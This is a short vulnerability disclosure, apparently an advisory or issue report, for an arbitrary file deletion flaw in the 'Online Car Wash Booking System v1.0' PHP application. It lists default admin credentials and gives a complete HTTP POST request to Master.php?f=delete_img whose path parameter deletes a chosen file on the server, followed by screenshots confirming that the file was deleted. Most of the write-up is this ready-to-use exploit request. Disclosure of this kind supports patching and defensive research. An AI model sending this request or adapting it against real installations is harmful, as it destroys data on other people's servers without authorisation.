# Online Car Wash Booking System v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/classes/Master.php?f=delete_img

Vulnerability location: /ocwbs/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shel.php file in the root directory

```sql
POST /ocwbs/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/ocwbs/admin/?page=system_info
Content-Length: 46
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Focwbs%2Fshell.php
```
At present, the shell.php file is still in the root directory of the website, when we send a request to delete the shell.php file

![image](https://user-images.githubusercontent.com/54017627/169308301-d83d3861-6e30-4db9-8333-ddb0da7337f0.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/169308039-7c2875ed-68a1-4743-ba2a-341cfc3039c4.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/169308176-f522abcb-e4cc-4731-8239-1f888bec675c.png)
